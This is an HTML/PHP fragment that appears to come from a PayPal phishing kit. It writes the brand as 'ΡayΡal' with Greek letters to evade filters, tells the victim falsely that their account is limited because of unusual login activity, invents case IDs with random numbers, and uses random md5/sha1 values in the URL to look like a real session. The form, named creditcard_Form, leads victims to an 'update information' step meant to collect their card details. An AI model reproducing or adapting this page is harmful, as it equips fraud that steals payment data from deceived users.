					<form method="post" name="creditcard_Form" action="websrc?cmd=_update-information&account_address=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>" class="edit">
                        <p class="group">&Rho;ay&Rho;al is constantly working to ensure security by regularly screening the accounts in our system. We recently reviewed your account, and we need more information to help us provide you with a secure service. Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologise for the inconvenience.
                        	<div class="dotted"><hr></div>
                        <p><strong>Why is my account access limited?</strong></p>
                        <p>Your account access has been limited for the following reason(s):</p>
                        <p>We noticed some unusual log in activity with your account.  Please check that no one has logged in to your account without your permission.
                        <br>
                        <p>(Your case ID for this reason is PP&#x2d;003&#x2d;<?php echo rand(100,999);?>&#x2d;<?php echo rand(100,500);?>&#x2d;<?php echo rand(100,999);?>.) </p>
                        <div class="dotted"><hr></div>
                        <strong>How can I get my account access restored?</strong>
                        <p><p>It&apos;s usually pretty easy to take care of things like this. Most of the time, we just need a little more information about your account.</p>
                        <p>To help us with this and to find out what you can and can&apos;t do with your account until the issue is resolved. </p></p>
                        </p>

                        <p class="bcenter">
                        <button style="width: 100px !important;" type="submit" value="Continue" class="button">Continue</button></p>
                        
                        
                    </form>